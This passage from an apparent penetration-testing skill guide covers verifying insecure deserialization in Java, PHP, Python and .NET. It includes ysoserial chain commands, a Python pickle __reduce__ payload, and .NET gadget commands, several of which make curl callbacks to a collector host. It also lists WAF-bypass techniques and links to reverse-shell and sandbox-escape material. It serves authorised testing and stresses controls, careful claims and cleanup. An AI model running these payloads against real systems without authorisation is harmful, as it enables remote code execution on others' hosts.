java -jar ysoserial.jar CommonsBeanutils1 "curl http://$COLL/java-beanutils" > /tmp/bu.ser 2>/dev/null
ls -l /tmp/cc6.ser /tmp/bu.ser 2>/dev/null
echo "  -> send the chain whose libraries you VERIFIED. A wrong chain produces a class-not-found error."
```

**Run URLDNS first, and never report a DNS interaction as RCE.** It proves the sink; the chain proves the
execution, and the library check is what makes the chain more than a guess.

### 17.4 PHP / Python / .NET - the per-language checks

```bash
# PHP: unserialize and PHAR. The control is a serialized value of the SAME type the app expects.
echo "=== PHP ==="
echo "  fingerprint: O:<len>:\"<Class>\":<n>:{...}  and  a:<n>:{...}"
echo "  check the class exists in the app's autoloader BEFORE building a chain"
echo "  PHAR: the deserialization trigger is a PHP stream wrapper on a phar:// path. Test:"
echo "    phar:///tmp/x.phar/test  in any file function (file_exists, fopen, getimagesize, ...)"
echo "  the control: a serialized value of the type the endpoint legitimately accepts"
echo
echo "=== PYTHON pickle ==="
echo "  fingerprint: \\x80\\x04\\x95 (protocol 4), \\x80\\x05 (protocol 5), or a base64 'gASV'"
echo "  a pickle sink is proven by __reduce__ execution reaching the collector:"
python3 - <<'PY'
import pickle, base64, os
class P:
    def __reduce__(self):
        return (os.system, ("curl -s http://coll.example:8899/pickle-probe",))
b = base64.b64encode(pickle.dumps(P())).decode()
print("  payload:", b[:80], "...")
print("  -> a callback with the TARGET's peer address proves the pickle sink. Nothing else does.")
print("  -> a raised exception alone proves nothing: pickle of an unknown class raises too.")
PY
echo
echo "=== .NET ==="
echo "  fingerprint: BinaryFormatter starts with 00 01 00 00 00 FF FF FF FF; also"
echo "  ObjectStateFormatter, LosFormatter, NetDataContractSerializer, and JSON.NET with TypeNameHandling"
echo "  ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c \"curl http://coll.example:8899/dn\""
echo "  the control: a BinaryFormatter blob of a benign serializable type the app defines"
echo "  NOTE: JSON.NET is only vulnerable with TypeNameHandling set; verify the setting, do not assume it"
```

**Each language has its own fingerprint and its own control.** A pickle of an unknown class raises exactly
as a known one does, so the exception is not the evidence - the callback is.

### 17.5 The WAF and filter bypass, with the control

```bash
# a blocked payload is not a non-vulnerability. Test the bypass, and keep the control.
P=""
echo "=== the bypass ladder, in order of cost ==="
for V in \
  'base64: wrap the blob so the signature is not at the start' \
  'gzip:   gzip the serialized bytes and let the sink decompress' \
  'utf-16: re-encode a string payload, if the sink accepts it' \
  'chunk:  split the parameter across a request-smuggling primitive' \
  'ctype:  change Content-Type so the WAF stops parsing the body' \
  'param:  move the blob to a second parameter or a nested JSON key' \
  'cookie: move the blob to a cookie if the app reads it there' \
  'path:   move the blob into a path segment or a header the WAF ignores'; do
  echo "  - $V"
done
echo
echo "=== THE CONTROL FOR EVERY BYPASS ==="
echo "  a WAF block page and a parse error can both be 500s. Always diff the BODY:"
curl -sS -o /tmp/a.out -w 'blocked payload : %{http_code} %{size_download}B\n' --data-urlencode "data=$P" "$T/deserialize"
curl -sS -o /tmp/b.out -w 'benign  payload : %{http_code} %{size_download}B\n' --data-urlencode 'data=O:8:"stdClass":1:{s:1:"a";s:1:"b";}' "$T/deserialize"
cmp -s /tmp/a.out /tmp/b.out && echo "  identical bodies -> the WAF did not distinguish; the finding stands" \
                            || echo "  DIFFERENT bodies   -> the WAF blocked it; report the bypass attempt separately"
```

**A blocked payload is not a non-vulnerability.** The body diff is what distinguishes a WAF block from the
application's own error handling.

### 17.6 The end-to-end harness

```bash
python3 - <<'PY'
import json, os, base64, subprocess, datetime

print("=== DESERIALIZATION ACCEPTANCE CHECKLIST ===")
checks = [
 ("the parameter IS deserialized",
  "a WELL-FORMED blob of the app's own type succeeds while a wrong-CLASS blob gives a distinct error"),
 ("the language is identified",
  "from the fingerprint: rO0ABX (Java), \\x80\\x04 (pickle), O:..:{ (PHP), 00 01 00 (BinaryFormatter)"),
 ("the library versions are confirmed",
  "the chosen chain's library and JDK range was verified against the target, not assumed"),
 ("the URLDNS or equivalent safe probe fired",
  "an OOB DNS interaction proves the SINK, and it is explicitly NOT reported as RCE"),
 ("the OOB callback's PEER is the target",
  "the collector log's peer field matches the target host, not the tester"),
 ("the chain ran and called back",
  "an HTTP callback from the target after the gadget payload was sent"),
 ("a control was run",
  "the same request with a benign serialized value, producing no callback"),
 ("the WAF result is honest",
  "if blocked, the bypass was attempted and the body diff recorded; a block is not a clean result"),
 ("impact is scoped",
  "state what the callback proves: code executed as the app's user, on the app's host"),
 ("cleanup is recorded",
  "any file written, process started, or credential read is listed and removed"),
]
for name, how in checks: print("  [ ] %-42s -> %s" % (name, how))
print()
print("=== THE COLLECTOR LOG IS THE RESULT ===")
LOG = "deser-callbacks.jsonl"
rows = [json.loads(l) for l in open(LOG)] if os.path.exists(LOG) else []
peers = sorted({r["peer"] for r in rows})
print("  callbacks:", len(rows), " peers:", peers or "<none>")
print("  -> a callback with a peer that is NOT the target is someone else's traffic")
print()
print("=== REPORT SHAPE ===")
print("  fingerprint -> the language and the parameter")
print("  sink proof  -> the URLDNS/DNS interaction, labelled as a sink proof, not RCE")
print("  execution   -> the HTTP callback, with peer, timestamp, and the chain name + version check")
print("  control     -> the benign blob produced no callback")
print("  cleanup     -> what ran and what was removed")
PY
```

**Sink proof and execution proof are different claims.** URLDNS proves the sink; the chain's callback
proves the execution, and the report must keep them apart.

---

## 19. RELATED SIBLINGS - REPORTING DISCIPLINE
1. **Establish that the parameter is actually deserialized before building any chain, using a wrong-class blob's distinct error as the signature** - a generic parse error on both a valid and an invalid blob means the parameter is not the sink.
2. **Run the URLDNS or equivalent safe probe first and never report a DNS interaction as RCE** - the sink proof and the execution proof are separate claims and conflating them is the family's central error.
3. **Verify the gadget chain's library and JDK range against the target before generating the payload** - a wrong chain produces a class-not-found error, and the version map in 17.3 is the check.
4. **Only count a callback as evidence when the collector's peer field is the target host** - a callback from your own address proves you triggered it, and a scanner's hit proves nothing.
5. **Run a benign serialized value of the app's own type as the control, and confirm it produces no callback** - without it, a callback cannot be attributed to the payload.
6. **Check `TypeNameHandling` and the equivalent settings on the .NET and JSON side rather than assuming them** - the serializer configuration, not the library, is the vulnerability.
7. **Test the `phar://` stream wrapper against every file function, not only an obvious upload path** - the trigger is the file operation, not the upload.
8. **Attempt the bypass ladder when a WAF blocks the payload, and diff the response BODY to tell a block from a parse error** - a block is not a non-vulnerability, and a 500 is not a success.
9. **Scope the impact precisely: code execution as the application's user, on the application's host** - do not escalate the claim beyond what the callback demonstrates.
10. **Record everything the payload wrote, started, or read, and remove it, listing any unremoved item as an open item** - a deserialization payload is the most damaging thing in this package to leave behind.
11. **Keep the payload, the chain name, the version check, the raw response, and the collector log with the report** - the version check is what lets a reader reproduce the result on their own target.

---

## 20. RELATED SIBLINGS - LOAD TOGETHER

- [jndi-injection](../jndi-injection/SKILL.md) - the sibling Java sink with the same callback proof
- [expression-language-injection](../expression-language-injection/SKILL.md) - the other Java-side code-execution sink
- [format-string-exploitation](../format-string-exploitation/SKILL.md) - the native-memory sibling
- [sandbox-escape-techniques](../sandbox-escape-techniques/SKILL.md) - what to do once the gadget runs
- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) - the post-execution channel
